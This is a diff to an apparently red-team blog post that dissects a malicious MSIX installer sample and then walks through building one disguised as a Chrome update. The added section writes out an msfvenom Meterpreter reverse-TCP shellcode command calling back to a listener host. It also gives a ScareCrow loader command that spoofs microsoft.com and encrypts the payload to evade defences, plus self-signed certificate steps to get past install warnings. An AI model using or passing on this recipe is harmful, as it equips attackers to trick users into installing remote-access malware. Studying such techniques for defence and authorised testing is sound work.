@@ -1,5 +1,5 @@
 ---
-title: "Creating malicious Chrome Updater files [.msix] for initial access"
+title: "Creating malicious [.msix] Chrome Updater files for initial access"
 author: "Trevor saudi"
 date: 2024-06-11
 description: ""
@@ -31,6 +31,7 @@ subtitle: ""
 .center { 
        display:inline-block; 
        margin-left: 60px; 
+       margin-top: -20px;
 }
 
 </style>
@@ -101,4 +102,110 @@ sample </a> from malwarebazaar.
 <img src="/posts/2024-06-11_asd/images/unzippedmsix.png"> 
 </div>
 
-- We can see the package payload containing the 
+- In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure it's correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.
+
+- 4 files are of interest to us:
+
+  1. AppxManifest
+  2. Config.json
+  3. StartingScriptWrapper
+  4. usJzY 
+
+### AppxManifest
+
+- I highlighted 2 important sections here. The properties and the applications section.
+
+<div class="center">
+<img src="/posts/2024-06-11_asd/images/appxmanifest.png"> 
+</div>
+
+- The properties contains details identifying the application such as the name, description and the logo that the app uses.
+- In the applications section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.
+- The capabilities section is used to specify systemn capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted aceceess to system resources via the `runFullTrust` capability.
+
+### Config.json
+
+- This is where things start to get interesting!
+
+<div class="center">
+<img src="/posts/2024-06-11_asd/images/configfile.png"> 
+</div>
+
+
+1. The PSF executable will be launched.
+2. scriptExecutionMode has been set to RemoteSigned, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.
+3. The start script section defines usJzY.ps1 as the script that will be executed at the start.
+4. showWindown has been set to false, meaning the powershell script will run in the background without invoking the command window.
+
+
+### StartingScriptWrapper
+
+- The StartingScriptWrapper is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.
+
+<div class="center">
+<img src="/posts/2024-06-11_asd/images/startingsciptwrapper.png"> 
+</div>
+
+
+### usJzY
+
+- Finally, we have the target script that is being executed by PSF.
+
+<br>
+
+<script src="https://gist.github.com/trevorsaudi/6d89accab3b06d02048fdd33d6d22bc1.js"></script>
+
+- In summary, this is what the script is performing:
+
+  1. Starts as a background job and collects some system information such as the domain name, AV software present in the system and the domain name (line 2-11)
+  2. Pulls a suspicious script from a remote URL and executes it. (line 20-80)
+  3. Finally opens https://asana.com in the browser then waits for the background job to finish executing before exiting.
+
+- This is what will contain the main logic for the implant being staged.
+
+## Building a malicious msix for Initial Access
+
+- Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that performs a Chrome update when installing before executing our target malware.
+
+### 1. Setting up the MSIX packaging tool and our setup file
+
+- First, you will need to install the MSIX packaging tool from the Microsoft Store
+
+<div class="center">
+<img src="/posts/2024-06-11_asd/images/msixpackagingtool.png"> 
+</div>
+
+- You will also need the Chrome setup file or whichever application you will be packaging.
+
+### 2. The implant being staged
+
+- We can quickly create a simple implant for the initial access. I will utilize an awesome repo called Scarecrow which I came across a while back that can create payloads that mimics reputable sources.
+- We create our shellcode with msfvenom
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 -f raw > protection.bin
+```
+
+- Then generate the loader using Scarecrow
+
+```bash
+./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES 
+
+```
+<div class="center">
+<img src="/posts/2024-06-11_asd/images/scarecroww.png"> 
+</div>
+
+### 3. Create an SSL certificate
+
+- When running the MSIX file, Windows will check for the digital signature of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.
+- Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.
+
+https://www.firegiant.com/docs/fg-wix/msix/signing-msix-packages/
+
+
+```powershell
+New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")
+-Type Custom -KeyUsage DigitalSignature -Subject "<Your Subject Name>" -FriendlyName "Your friendly name goes here"
+
+```
